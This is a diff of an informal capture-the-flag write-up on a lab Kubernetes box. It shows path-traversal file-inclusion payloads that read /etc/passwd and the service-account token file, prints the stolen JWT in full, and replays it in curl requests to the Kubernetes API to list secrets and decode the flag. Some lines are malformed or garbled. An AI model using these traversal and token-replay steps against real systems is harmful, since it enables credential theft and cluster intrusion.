@@ -119,14 +119,26 @@ and there was 2 site running one on port 80 and another on 8443
 	Nmap done: 1 IP address (1 host up) scanned in 119.10 seconds
 
 	 
+	 
+and we found that the site is vulnerable to lfi 
+so we some basic lfi and its vulnerable 
+
+	10.10.231.27/?page=../../../../../../../etc/passwd
+ 
+did some research on Kubernetes lfi and found that it has a token 
+
+	 http://10.10.236.174/?page=../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
+	 
 ## token
 	 eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg4NDkxOTU4LCJpYXQiOjE2NTY5NTU5NTgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJpc2xhbmRzLTc2NTViNzc0OWYtenZxNTIiLCJ1aWQiOiJiMzEwNjkyMS00OTBhLTQ3NjctOGQ1OS03MmY2NjkxYmY5YzAifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImlzbGFuZHMiLCJ1aWQiOiI5OTIzOTA1OS00ZjZjLTQwNmItODI5NC01YTU1ZmJjMTQzYjAifSwid2FybmFmdGVyIjoxNjU2OTU5NTY1fSwibmJmIjoxNjU2OTU1OTU4LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDppc2xhbmRzIn0.WyPc6fANUecUj16PKiAVvbzwt822FP7pnKAHAoIcTgKjr4AQj8HR-GHkJWphmKvnVWFH1OybzfYPUSD2rNKMQtVAEySoFI3jY9MQBshghoMtROyiYRQnBcuw_5LQcFczmSncP3kTc1KCbOzp_nnPoX4ndQLhkbcSfQ8ta9o4jtKMfWrTd3njbHNjZO_AQTOurFfXM3277ZfT7SWLt4KLC5hTVYl4lnJ6EjjgGr_k7V6zAEk1jSJIq7oud0ln-9XJvQR5bl1b8E2j9ooZQ8B1FyIGFxi1gb16EtM2uCFVL9hiBy83hatR6eqvgzQer-6X2g3I-zCF37eTLMi73PlPRg
 	 
-	 
-put this in jwt.io
+don't know what to do with the token and did some googling and found that it is encrypted put this in jwt.io to decrypt and found some interesting results 
 
 
-	 
+
+
+and i was stuck again don't  know what to do next so i tries lfi on the Kubernetes 
+
 	curl -k http:/10.10.231.27/:8443/kube-apiserver               
 	<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 	<html><head>
@@ -137,12 +149,28 @@ put this in jwt.io
 	<hr>
 	<address>Apache/2.2.22 (Ubuntu) Server at 10.10.231.27 Port 80</address>
 	</body></html>
+and it responded so i tried to do more lfi but there was authentication problem so i did use the token as the header and did some googling about  "*curl kubernet"* 
 
 
+	curl -k -v https://10.10.231.27:8443/api/v1/namespaces/ --header "Authorization: Bearer  eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg4NDkxOTU4LCJpYXQiOjE2NTY5NTU5NTgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJpc2xhbmRzLTc2NTViNzc0OWYtenZxNTIiLCJ1aWQiOiJiMzEwNjkyMS00OTBhLTQ3NjctOGQ1OS03MmY2NjkxYmY5YzAifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImlzbGFuZHMiLCJ1aWQiOiI5OTIzOTA1OS00ZjZjLTQwNmItODI5NC01YTU1ZmJjMTQzYjAifSwid2FybmFmdGVyIjoxNjU2OTU5NTY1fSwibmJmIjoxNjU2OTU1OTU4LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDppc2xhbmRzIn0.WyPc6fANUecUj16PKiAVvbzwt822FP7pnKAHAoIcTgKjr4AQj8HR-GHkJWphmKvnVWFH1OybzfYPUSD2rNKMQtVAEySoFI3jY9MQBshghoMtROyiYRQnBcuw_5LQcFczmSncP3kTc1KCbOzp_nnPoX4ndQLhkbcSfQ8ta9o4jtKMfWrTd3njbHNjZO_AQTOurFfXM3277ZfT7SWLt4KLC5hTVYl4lnJ6EjjgGr_k7V6zAEk1jSJIq7oud0ln-9XJvQR5bl1b8E2j9ooZQ8B1FyIGFxi1gb16EtM2uCFVL9hiBy83hatR6eqvgzQer-6X2g3I-zCF37eTLMi73PlPRg"
 
 
+dfjklflk
 
-search for curl kubernet
+	curl -k   https://10.10.236.174:8443/api/v1/ -H "Authorization: Bearer $TOKEN"
+	
+when i did this and the results were intresting i found out that there was  secrets file 
+so i began to enumurate it 
+
+	curl -k -v https://10.10.236.174:8443/api/v1/namespaces/default/secrets -H "Authorization: Bearer $TOKEN"
+
+vola !!!!!!!!!!got the flag encrypted
 
 
-	curl -k -v https://10.10.231.27:8433/api/v1/namespaces/ --header "Authorization: Bearer  eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg4NDkxOTU4LCJpYXQiOjE2NTY5NTU5NTgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJpc2xhbmRzLTc2NTViNzc0OWYtenZxNTIiLCJ1aWQiOiJiMzEwNjkyMS00OTBhLTQ3NjctOGQ1OS03MmY2NjkxYmY5YzAifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImlzbGFuZHMiLCJ1aWQiOiI5OTIzOTA1OS00ZjZjLTQwNmItODI5NC01YTU1ZmJjMTQzYjAifSwid2FybmFmdGVyIjoxNjU2OTU5NTY1fSwibmJmIjoxNjU2OTU1OTU4LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDppc2xhbmRzIn0.WyPc6fANUecUj16PKiAVvbzwt822FP7pnKAHAoIcTgKjr4AQj8HR-GHkJWphmKvnVWFH1OybzfYPUSD2rNKMQtVAEySoFI3jY9MQBshghoMtROyiYRQnBcuw_5LQcFczmSncP3kTc1KCbOzp_nnPoX4ndQLhkbcSfQ8ta9o4jtKMfWrTd3njbHNjZO_AQTOurFfXM3277ZfT7SWLt4KLC5hTVYl4lnJ6EjjgGr_k7V6zAEk1jSJIq7oud0ln-9XJvQR5bl1b8E2j9ooZQ8B1FyIGFxi1gb16EtM2uCFVL9hiBy83hatR6eqvgzQer-6X2g3I-zCF37eTLMi73PlPRg"
+	ZmxhZ3swOGJlZDlmYzBiYzZkOTRmZmY5ZTUxZjI5MTU3Nzg0MX0=
+
+its base64
+
+and the flag is 		
+
+	flag{08bed9fc0bc6d94fff9e51f291577841}
